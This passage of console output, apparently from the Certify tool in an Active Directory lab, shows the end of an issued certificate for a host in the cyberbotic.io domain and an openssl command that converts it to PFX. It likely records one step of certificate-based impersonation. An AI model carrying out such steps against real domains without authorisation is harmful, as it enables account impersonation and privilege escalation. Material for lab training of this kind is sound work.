AGgAaQBuAGUwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1UdDwEB
/wQEAwIFoDAdBgNVHQ4EFgQUK8NTUaQatlWElFzZgcD1Jn7CNx8wHwYDVR0jBBgw
FoAURPG6Bl9QkGEzSzvE3MSAGuv6gXYwgcEGA1UdHwSBuTCBtjCBs6CBsKCBrYaB
qmxkYXA6Ly8vQ049Y2EtMixDTj1kYy0yLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVy
Ym90aWMsREM9aW8/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG4BggrBgEFBQcBAQSBqzCBqDCB
pQYIKwYBBQUHMAKGgZhsZGFwOi8vL0NOPWNhLTIsQ049QUlBLENOPVB1YmxpYyUy
MEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9
Y3liZXJib3RpYyxEQz1pbz9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAiBgNVHREEGzAZghdzcnYtMS5kZXYuY3li
ZXJib3RpYy5pbzANBgkqhkiG9w0BAQsFAAOCAQEAFsp729KMD02+cDeTr1xlstU/
+q/RPAWLye4lytYeukajrgkEOfhm0od1oB0r+wGsASb6/5ScRoOWTlNEyYg2lDTh
vhzzX92wUfvyIJBo9t4UWPrBbQV0Z9R+ndgT6N77S85XiUh1taHBaaB7nsq8JJgI
moqivYEMA0eQTdDIPPDvCckcQUA7M4SHiVjnGGMQ0tjYSeFaZjwwIZoBuDgHePMP
VqELtIUljHTRweEGYQBjknFscwngSbyccRNC3U2X3yqoDPezm0MXdZQGuyzpjLou
O0ZlAuHbLV1GxIDzrZFqieWAIt75azBKm5MaRNIMYKeATXjfSB52Nd9jfNbxrQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:16.4998413

```